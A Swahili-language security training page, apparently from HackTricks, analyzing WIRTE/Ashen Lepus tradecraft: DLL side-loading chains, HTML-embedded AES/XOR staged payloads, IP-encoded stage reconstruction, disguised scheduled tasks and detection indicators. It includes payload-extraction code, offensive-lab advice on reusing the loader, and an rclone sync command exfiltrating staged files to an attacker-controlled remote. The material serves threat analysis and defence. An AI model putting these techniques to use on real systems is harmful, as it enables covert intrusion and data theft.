# DLL Side-Loading ya Kina yenye Staging ya Payload Iliyopachikwa ndani ya HTML

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari wa Tradecraft

Ashen Lepus (aka WIRTE) ilitumia kimkakati muundo unaoweza kurudiwa unaounganisha DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya mitandao ya kidiplomasia ya Mashariki ya Kati. Mbinu hii inaweza kutumiwa tena na operator yeyote kwa sababu inategemea:<sup>[[1]](#references)</sup>

- **Uhandisi wa kijamii unaotegemea archive**: PDF zisizo na madhara huwaelekeza walengwa kupakua RAR archive kutoka tovuti ya kushiriki faili. Archive hiyo hujumuisha EXE ya kuonyesha hati inayoonekana halisi, DLL hasidi iliyopewa jina la library inayoaminika (kwa mfano, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na `Document.pdf` ya kupumbaza.
- **Matumizi mabaya ya mpangilio wa utafutaji wa DLL**: mwathiriwa hubofya EXE mara mbili, Windows hupata DLL import kutoka kwenye current directory, na loader hasidi (AshenLoader) hutekelezwa ndani ya process inayoaminika huku PDF ya kupumbaza ikifunguka ili kuepusha mashaka.
- **Living-off-the-land staging**: kila stage inayofuata (AshenStager → AshenOrchestrator → modules) huwekwa nje ya diski hadi ihitajike, na kuwasilishwa kama blobs zilizosimbwa kwa njia fiche zilizofichwa ndani ya HTTP responses zinazoonekana kutokuwa na madhara.

## Mlolongo wa Side-Loading wa Hatua Nyingi

1. **Decoy EXE → AshenLoader**: EXE hupakia AshenLoader kupitia side-loading. AshenLoader hukusanya taarifa za host, huzisimba kwa AES-CTR, kisha huzituma ndani ya vigezo vinavyozungushwa kama `token=`, `id=`, `q=`, au `auth=` kwenda kwenye njia zinazoonekana kama za API (kwa mfano, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Utoaji wa HTML**: C2 hufichua stage inayofuata tu ikiwa IP ya client inaonyesha eneo la lengo kijiografia na `User-Agent` inalingana na implant, jambo linalozuia sandbox. Ukaguzi unapofaulu, HTTP body huwa na blob ya `<headerp>...</headerp>` iliyo na payload ya AshenStager iliyosimbwa kwa Base64/AES-CTR.
3. **Side-loading ya pili**: AshenStager hupelekwa pamoja na binary nyingine halali inayo-import `wtsapi32.dll`. Nakala hasidi iliyoingizwa ndani ya binary hiyo hupakua HTML zaidi, na safari hii hutoa maudhui ya `<article>...</article>` ili kupata AshenOrchestrator.
4. **AshenOrchestrator**: controller ya modular .NET inayodecode config ya JSON ya Base64. Sehemu za `tg` na `au` za config huunganishwa/kufanyiwa hash ili kuunda AES key, ambayo husimbua `xrk`. Byte zinazopatikana hutumika kama XOR key kwa kila module blob inayopakuliwa baadaye.
5. **Uwasilishaji wa Module**: kila module hufafanuliwa kupitia HTML comments zinazoelekeza parser kwenye tag yoyote, na hivyo kuvunja kanuni za static zinazotafuta `<headerp>` au `<article>` pekee. Modules zinajumuisha persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).

### Muundo wa Kuchanganua HTML Container

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Hata kama watetezi watazuia au kuondoa kipengele fulani, operator anahitaji tu kubadilisha tag iliyoonyeshwa kwenye maoni ya HTML ili kuendelea na uwasilishaji.<sup>[[1]](#references)</sup>

### Msaidizi wa Haraka wa Uchimbuaji (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Ulinganifu wa Kukwepa kwa HTML Staging

Utafiti wa hivi karibuni kuhusu HTML smuggling (Talos) unaangazia payload zilizofichwa kama mifuatano ya Base64 ndani ya vizuizi vya `<script>` kwenye viambatisho vya HTML, kisha kufumbuliwa kwa JavaScript wakati wa utekelezaji.<sup>[[2]](#references)</sup> Mbinu hiyo hiyo inaweza kutumika tena kwa majibu ya C2: weka blobs zilizosimbwa kwa njia fiche ndani ya tag ya script (au kipengele kingine cha DOM) na uzifumbue kwenye kumbukumbu kabla ya AES/XOR, ili ukurasa uonekane kama HTML ya kawaida. Talos pia inaonyesha obfuscation ya tabaka nyingi (kubadilisha majina ya vitambulishi pamoja na Base64/Caesar/AES) ndani ya tag za script, ambayo inafaa moja kwa moja kwa blobs za C2 zilizowekwa ndani ya HTML.<sup>[[2]](#references)</sup> Makala ya baadaye ya Talos kuhusu **hidden text salting** pia inahusika hapa: kugawa Base64 kwa kutumia maoni ya HTML yasiyo na umuhimu au nafasi tupu kunatosha kuvuruga vichimbuzi rahisi vya regex huku urejeshaji wake upande wa browser ukiwa rahisi.<sup>[[7]](#references)</sup>

## Maelezo ya Variant za Hivi Karibuni (2024-2025)

- Check Point iliona kampeni za WIRTE mwaka 2024 ambazo bado zilitegemea sideloading inayotumia archive, lakini zilitumia `propsys.dll` (stagerx64) kama hatua ya kwanza. Stager hufumbua payload inayofuata kwa Base64 + XOR (key `53`), hutuma maombi ya HTTP yenye `User-Agent` iliyowekwa kwa hardcode, na kutoa blobs zilizosimbwa kwa njia fiche zilizopachikwa kati ya tag za HTML. Katika tawi moja, hatua hiyo ilijengwa upya kutoka kwenye orodha ndefu ya mifuatano ya IP iliyopachikwa, iliyofumbuliwa kwa kutumia `RtlIpv4StringToAddressA`, kisha kuunganishwa kuwa bytes za payload.<sup>[[3]](#references)</sup>
- OWN-CERT iliandika kuhusu zana za awali za WIRTE ambapo dropper iliyopakiwa kwa sideload kupitia `wtsapi32.dll` ililinda mifuatano kwa Base64 + TEA na kutumia jina la DLL lenyewe kama decryption key, kisha ikaficha data ya utambulisho wa host kwa XOR/Base64 kabla ya kuituma kwa C2.<sup>[[4]](#references)</sup>

## Kujenga Upya Hatua Zilizosimbwa kama IP

Tawi la WIRTE la `propsys.dll` la 2024 linaonyesha kuwa PE inayofuata si lazima ihifadhiwe kama blob moja mfululizo ya HTML. Loader inaweza kuhifadhi bytes za stage kama mifuatano ya dotted-quad na kuzijenga upya kwa `RtlIpv4StringToAddressA`, mbinu inayofanana kwa karibu na tradecraft ya **IPfuscation** ya Hive.<sup>[[3]](#references)[[5]](#references)</sup> Kwa matumizi ya kiutendaji, hii ni muhimu pale ambapo actor anataka ukurasa wa HTML uwe na vitu vinavyoonekana kama IOCs au data ya usanidi isiyo na madhara badala ya payload ya Base64 iliyo wazi.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Ikiwa bytes zilizorejeshwa zinaanza na `MZ`, huenda umeunda upya PE inayofuata moja kwa moja. Ikiwa sivyo, angalia kama kuna layer ya XOR/Base64 mwanzoni au vipande vidogo vya vitenganishi kati ya anwani.

## Majina ya DLL Yanayoweza Kubadilishwa na Mzunguko wa Host

Sifa muhimu ya muundo huu ni kwamba **backend ya HTML/AES/XOR staging inaweza kubaki ileile huku jozi ya sideload ikibadilika tu**. WIRTE ilibadilisha kati ya `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, na `propsys.dll` katika kampeni mbalimbali, jambo linalofaa kwa sababu:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` na `wtsapi32.dll` ni majina ya kawaida ya Windows DLL ambayo watetezi wanatarajia kuwepo katika `%System32%` / `%SysWOW64%`.
- Katalogi za umma kama **HijackLibs** tayari zina ramani ya binary nyingi ambazo zitapakia majina hayo ya DLL kutoka kwenye saraka ya programu iliyonakiliwa, hivyo kuwapa operators host mbadala bila kuhitaji kuunda upya stager.
- Ni sehemu ya export pekee inayohitaji kubadilishwa kulingana na host. HTML parser, taratibu za AES/XOR, na module loader kwa kawaida zinaweza kuhamishwa bila mabadiliko kwenye forwarding proxy DLL.

Kwa kazi ya offensive lab, hii inamaanisha unaweza kugawa tatizo katika **(1) kupata host thabiti iliyosainiwa ambayo hutatua jina la DLL ulilochagua ndani ya nchi** na **(2) kutumia tena mantiki ileile ya staged-HTML loader nyuma ya DLL hiyo**.

## Uimarishaji wa Crypto na C2

- **AES-CTR kila mahali**: loaders za sasa hujumuisha funguo za biti 256 pamoja na nonces (k.m., `{9a 20 51 98 ...}`) na kwa hiari huongeza layer ya XOR kwa kutumia strings kama `msasn1.dll` kabla/baada ya decryption.<sup>[[1]](#references)</sup>
- **Tofauti za key material**: loaders za awali zilitumia Base64 + TEA kulinda strings zilizopachikwa, huku ufunguo wa decryption ukitokana na jina la malicious DLL (k.m., `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Kutenganisha infrastructure + kuficha kwa subdomain**: staging servers hutenganishwa kwa kila tool, huwekwa kwenye ASNs tofauti, na wakati mwingine hufichwa nyuma ya subdomains zinazoonekana halali, ili kufichuliwa kwa stage moja kusifichue nyingine.
- **Kuficha recon**: data iliyoorodheshwa sasa inajumuisha orodha za Program Files ili kutambua programu zenye thamani kubwa na husimbwa kwa encryption kila mara kabla haijaondoka kwenye host.
- **Kubadilisha URI mara kwa mara**: query parameters na REST paths hubadilika kati ya kampeni (`/api/v1/account?token=` → `/api/v2/account?auth=`), na hivyo kufanya detections zisizobadilika kuwa batili.
- **Kufunga User-Agent + redirects salama**: C2 infrastructure hujibu tu strings halisi za UA; vinginevyo huelekeza kwenye tovuti zisizo na madhara za habari/afya ili kufanana na trafiki ya kawaida.
- **Uwasilishaji wenye masharti**: servers huzuiwa kulingana na eneo na hujibu implants halisi pekee. Clients zisizoidhinishwa hupokea HTML isiyotiliwa shaka.

## Persistence na Mzunguko wa Utekelezaji

AshenStager huunda scheduled tasks zinazojifanya kazi za matengenezo ya Windows na kutekelezwa kupitia `svchost.exe`, kwa mfano:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Tasks hizi huwasha tena mnyororo wa sideloading wakati wa boot au kwa vipindi maalum, na kuhakikisha kuwa AshenOrchestrator inaweza kuomba modules mpya bila kuandika tena kwenye disk.

## Kutumia Sync Clients Zisizo na Madhara kwa Exfiltration

Operators huweka hati za kidiplomasia ndani ya `C:\Users\Public` (inayosomeka na wote na isiyo na mashaka) kupitia module maalum, kisha hupakua binary halali ya [Rclone](https://rclone.org/) ili kusawazisha saraka hiyo na hifadhi inayodhibitiwa na mshambuliaji. Unit42 inabainisha kuwa hii ndiyo mara ya kwanza actor huyu kuonekana akitumia Rclone kwa exfiltration, ikilingana na mwenendo mpana wa kutumia vibaya zana halali za sync ili kufanana na trafiki ya kawaida:<sup>[[1]](#references)</sup>

1. **Kuweka**: nakili/kusanya faili lengwa kwenye `C:\Users\Public\{campaign}\`.
2. **Kusanidi**: peleka Rclone config inayoelekeza kwenye HTTPS endpoint inayodhibitiwa na mshambuliaji (k.m., `api.technology-system[.]com`).
3. **Kusawazisha**: endesha `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ili trafiki ifanane na backups za kawaida za cloud.

Kwa kuwa Rclone hutumika sana katika workflows halali za backup, watetezi wanapaswa kuzingatia utekelezaji usio wa kawaida (binary mpya, remotes zisizo za kawaida, au kusawazishwa kwa ghafla kwa `C:\Users\Public`).

## Viashiria vya Ugunduzi

- Toa tahadhari kuhusu **processes zilizosainiwa** zinazopakia DLL bila kutarajiwa kutoka kwenye paths zinazoweza kuandikwa na mtumiaji (Procmon filters + `Get-ProcessMitigation -Module`), hasa pale majina ya DLL yanapolingana na `netutils`, `srvcli`, `dwampi`, `wtsapi32`, au `propsys`.<sup>[[6]](#references)</sup>
- Kagua majibu ya HTTPS yenye mashaka ili kubaini **Base64 blobs kubwa zilizopachikwa ndani ya tags zisizo za kawaida** au zilizolindwa na comments za `<!-- TAG: <xyz> -->`.
- Rekebisha HTML kwanza: **ondoa comments na punguza nafasi tupu kabla ya kutoa Base64**, kwa sababu mbinu ya evasion ya hidden-text-salting inaweza kugawa payloads katika mipaka ya comments.
- Panua uchunguzi wa HTML ili kujumuisha **strings za Base64 ndani ya `<script>` blocks** (staging ya mtindo wa HTML smuggling) zinazofanyiwa decoding na JavaScript kabla ya uchakataji wa AES/XOR.
- Tafuta miito inayojirudia ya **`RtlIpv4StringToAddressA` ikifuatiwa na kuunganishwa kwa buffer**, hasa pale strings zinazozizunguka zinapokuwa orodha ndefu za IPv4 badala ya targets halisi za mtandao.
- Tafuta **scheduled tasks** zinazoendesha `svchost.exe` na arguments zisizo za huduma au zinazoelekeza kwenye saraka za dropper.
- Fuatilia **C2 redirects** zinazorejesha payloads kwa strings halisi za `User-Agent` pekee na vinginevyo kuelekeza kwenye domains halali za habari/afya.
- Fuatilia **binary za Rclone** zinazoonekana nje ya maeneo yanayosimamiwa na IT, faili mpya za `rclone.conf`, au kazi za sync zinazochukua data kutoka saraka za staging kama `C:\Users\Public`.

## References

- [1] [Ashen Lepus Inayohusishwa na Hamas Yalenga Taasisi za Kidiplomasia za Mashariki ya Kati kwa Kifurushi Kipya cha Malware cha AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Iliyofichwa kati ya tags: Maarifa kuhusu mbinu za evasion katika HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Threat Actor WIRTE Inayohusishwa na Hamas Yaendeleza Operesheni Zake za Mashariki ya Kati na Kuelekea kwenye Shughuli za Kuvuruga](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Kutafuta Muda Uliopotea](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Yatumia Mbinu Mpya ya IPfuscation Kuepuka Ugunduzi](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Uwezekano wa System DLL Sideloading kutoka Maeneo Yasiyo ya System](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Kuongeza ladha kwa vitisho vya barua pepe kwa hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
